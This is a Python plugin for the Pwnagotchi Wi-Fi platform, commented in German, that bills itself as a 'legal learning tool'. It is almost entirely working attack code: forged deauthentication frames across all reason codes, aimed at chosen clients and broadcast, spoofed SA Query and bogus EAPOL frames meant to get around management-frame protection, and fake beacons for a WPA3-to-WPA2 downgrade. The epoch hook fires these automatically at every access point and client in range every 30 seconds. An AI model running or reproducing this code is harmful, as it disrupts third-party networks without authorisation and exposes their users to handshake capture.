#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Blitzcat - Total cat Edition
Author: ShaddamIV
License: cute cat

Legal WIFI Testtool to learn:
- Reason code transmit (1-17)
- Sequence number learning audit
- PMF workflow (SA Query + GTK error)
- Three-stage rocket flying
- AP-initiated deauth idea
- Channel hopping tracing
- Client connection verification
"""

import logging
import time
import random
import os
import subprocess
from typing import List, Optional

import pwnagotchi.plugins as plugins

# Scapy für Paketinjektion
try:
    from scapy.all import RadioTap, Dot11, Dot11Deauth, Dot11Action, Dot11Beacon
    from scapy.all import Dot11Elt, LLC, SNAP, EAPOL, Raw, sendp, sniff
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

# ----------------------------------------------------------------------
# Konstanten
# ----------------------------------------------------------------------
BRUTAL_REASON_CODES = list(range(1, 18))      # 1-17
AP_INITIATED_CODES = [4, 5, 8, 9, 12, 15]

# ----------------------------------------------------------------------
# Hauptplugin
# ----------------------------------------------------------------------
class cutecat(plugins.Plugin):
    __author__ = 'ShaddamIV'
    __version__ = '1.0'
    __license__ = 'cute cat'
    __description__ = 'This is for learning – Brutal Force Deauth'

    def __init__(self):
        super().__init__()
        self.logger = logging.getLogger(__name__)
        self.scapy_available = SCAPY_AVAILABLE
        self.monitor_iface = "wlan0"
        self.inject_iface = "wlan0"
        self.attack_count = 0
        self.last_attack = 0
        self.brutal_force_mode = True
        self.pmf_workflow_enabled = True
        self.enable_wpa3_downgrade = True

    # ------------------------------------------------------------------
    # Plugin Lifecycle
    # ------------------------------------------------------------------
    def on_loaded(self):
        self.logger.info("🐱 cutecat geladen (Brutal Force Edition)")
        if not self.scapy_available:
            self.logger.error("Scapy nicht verfügbar – Deauth deaktiviert")
        else:
            self.logger.info("Scapy OK – Angriffe aktiv")

    def on_config_changed(self, config):
        """Liest Konfiguration aus config.toml"""
        cfg = config["main"]["plugins"].get("cutecat", {})
        self.monitor_iface = cfg.get("monitor_iface", "wlan0")
        self.inject_iface = cfg.get("inject_iface", self.monitor_iface)
        self.brutal_force_mode = cfg.get("brutal_force_mode", True)
        self.pmf_workflow_enabled = cfg.get("pmf_workflow_enabled", True)
        self.enable_wpa3_downgrade = cfg.get("enable_wpa3_downgrade", True)
        self.logger.info(f"Konfiguration geladen: iface={self.monitor_iface}")

    def on_ready(self, agent):
        self.agent = agent
        self.logger.info("🐱 cutecat bereit – greift jede Epoche an!")

    # ------------------------------------------------------------------
    # Kernfunktionen
    # ------------------------------------------------------------------
    def get_valid_sequence_number(self, ap_mac: str, cl_mac: str) -> int:
        """Schnüffelt eine gültige Sequenznummer (optional)"""
        if not self.scapy_available:
            return random.randint(1, 0xFFF)
        seq_numbers = []
        def pkt_handler(pkt):
            if pkt.haslayer(Dot11):
                # Paket zwischen AP und Client?
                if (pkt.addr1 == cl_mac and pkt.addr2 == ap_mac) or \
                   (pkt.addr1 == ap_mac and pkt.addr2 == cl_mac):
                    if hasattr(pkt, 'SC'):
                        seq = (pkt.SC >> 4) & 0xFFF
                        seq_numbers.append(seq)
        sniff(iface=self.monitor_iface, prn=pkt_handler, timeout=0.5, store=0)
        if seq_numbers:
            return (max(seq_numbers) + 1) & 0xFFF
        return random.randint(1, 0xFFF)

    def brutal_deauth_attack(self, ap_mac: str, client_macs: List[str]):
        """Sendet Deauths mit allen Reason Codes – Broadcast und gerichtet"""
        if not self.scapy_available or not client_macs:
            return
        self.logger.info(f"🔥 Brutal Force Angriff auf {ap_mac} mit {len(client_macs)} Clients")

        for cl_mac in client_macs[:3]:  # Max 3 Clients
            seq = self.get_valid_sequence_number(ap_mac, cl_mac)

            # Runde 1 – Alle Reason Codes (gerichtet)
            for i, reason in enumerate(BRUTAL_REASON_CODES):
                pkt = RadioTap() / Dot11(
                    addr1=cl_mac,
                    addr2=ap_mac,
                    addr3=ap_mac,
                    FCfield=0xC0
                ) / Dot11Deauth(reason=reason)
                #pkt[Dot11].SC = ((seq + i) & 0xFFF) << 4
                pkt[Dot11].SC = ((seq + reason) & 0xFFF) << 4
                try:
                    sendp(pkt, iface=self.inject_iface, count=1, verbose=0)
                    time.sleep(0.003)
                except:
                    pass

            # Runde 2 – AP‑initiierte Deauths (From DS Flag)
            for reason in AP_INITIATED_CODES:
                pkt = RadioTap() / Dot11(
                    addr1=cl_mac,
                    addr2=ap_mac,
                    addr3=ap_mac,
                    FCfield=0xC1       # from DS
                ) / Dot11Deauth(reason=reason)
                pkt[Dot11].SC = seq << 4
                try:
                    sendp(pkt, iface=self.inject_iface, count=1, verbose=0)
                    time.sleep(0.003)
                except:
                    pass

            # Runde 3 – Broadcast Deauths (alle Clients)
            for reason in BRUTAL_REASON_CODES[:8]:
                bcast = RadioTap() / Dot11(
                    addr1="ff:ff:ff:ff:ff:ff",
                    addr2=ap_mac,
                    addr3=ap_mac,
                    FCfield=0xC0
                ) / Dot11Deauth(reason=reason)
                try:
                    sendp(bcast, iface=self.inject_iface, count=1, verbose=0)
                    time.sleep(0.003)
                except:
                    pass

        self.logger.info(f"✅ Brutal Force Angriff auf {ap_mac} abgeschlossen")

    def pmf_workflow_attack(self, ap_mac: str, client_macs: List[str]):
        """PMF‑Bypass: SA Query + GTK Error + CSA"""
        if not self.scapy_available or not self.pmf_workflow_enabled:
            return
        for cl_mac in client_macs[:2]:
            # SA Query
            try:
                sa = RadioTap() / Dot11(addr1=ap_mac, addr2=cl_mac, addr3=ap_mac)
                sa /= Dot11Action(category=8, action=0)
                sa /= Raw(b'\x00' * 12)
                sendp(sa, iface=self.inject_iface, count=2, inter=0.1, verbose=0)
                time.sleep(0.2)
            except:
                pass
            # GTK Error (falscher Group Key)
            try:
                gtk = RadioTap() / Dot11(addr1=cl_mac, addr2=ap_mac, addr3=ap_mac)
                gtk /= LLC() / SNAP() / EAPOL(version=2, type=3, len=5) / Raw(b'\x03' * 5)
                sendp(gtk, iface=self.inject_iface, count=3, inter=0.05, verbose=0)
                time.sleep(0.3)
            except:
                pass

    def wpa3_downgrade_attack(self, ap_mac: str, client_macs: List[str]):
        """Versucht WPA3 auf WPA2 zu downgraden (Beacon mit RSN WPA2)"""
        if not self.enable_wpa3_downgrade or not self.scapy_available:
            return
        for cl_mac in client_macs[:2]:
            pkt = RadioTap() / Dot11(addr1=cl_mac, addr2=ap_mac, addr3=ap_mac)
            pkt /= Dot11Beacon(cap=0x0421)
            # RSN IE für WPA2‑PSK
            rsn = Dot11Elt(ID=48, len=20,
                           info=b'\x01\x00'                    # Version
                                b'\x00\x0f\xac\x04'            # Group Cipher CCMP
                                b'\x01\x00'                    # Pairwise Count
                                b'\x00\x0f\xac\x04'            # Pairwise CCMP
                                b'\x01\x00'                    # AKM Count
                                b'\x00\x0f\xac\x02')           # AKM PSK
            pkt /= rsn
            try:
                sendp(pkt, iface=self.inject_iface, count=3, inter=0.2, verbose=0)
                self.logger.debug(f"WPA3‑Downgrade zu {cl_mac}")
            except:
                pass

    # ------------------------------------------------------------------
    # Pwnagotchi Events
    # ------------------------------------------------------------------
    def on_epoch(self, agent, epoch, epoch_data):
        """Wird etwa alle 30 Sekunden aufgerufen – Hauptangriffslogik"""
        if not self.scapy_available:
            return
        # Nicht zu oft angreifen (alle 30 Sekunden reicht)
        now = time.time()
        if now - self.last_attack < 30:
            return
        self.last_attack = now
        self.attack_count += 1

        self.logger.info(f"🐱 Epoche {epoch} – Angriff #{self.attack_count}")

        # Aktuelle Access Points und Clients aus dem Agent holen
        try:
            aps = agent.get('aps', [])
            clients = []
            for ap in aps:
                # Clients sind in ap['clients'] gespeichert
                for cl in ap.get('clients', []):
                    clients.append((ap['mac'], cl['mac']))
            if not clients:
                self.logger.debug("Keine Clients in Reichweite")
                return

            # Gruppiere Clients nach AP
            ap_clients = {}
            for ap_mac, cl_mac in clients:
                ap_clients.setdefault(ap_mac, []).append(cl_mac)

            for ap_mac, cl_list in ap_clients.items():
                self.brutal_deauth_attack(ap_mac, cl_list[:5])
                if self.pmf_workflow_enabled:
                    self.pmf_workflow_attack(ap_mac, cl_list[:2])
                if self.enable_wpa3_downgrade:
                    self.wpa3_downgrade_attack(ap_mac, cl_list[:2])

        except Exception as e:
            self.logger.error(f"Fehler in on_epoch: {e}")

    # ------------------------------------------------------------------
    # Weitere valide Event-Handler (optional, für Logging)
    # ------------------------------------------------------------------
    def on_wifi_update(self, agent, access_points):
        """Wird aufgerufen, wenn sich die Access-Point-Liste aktualisiert."""
        # Hier könntest du die Liste der APs und Clients durchgehen.
        pass

    def on_handshake(self, agent, filename, access_point, client_station):
        self.logger.info(f"🎉 Handshake erfasst: {filename}")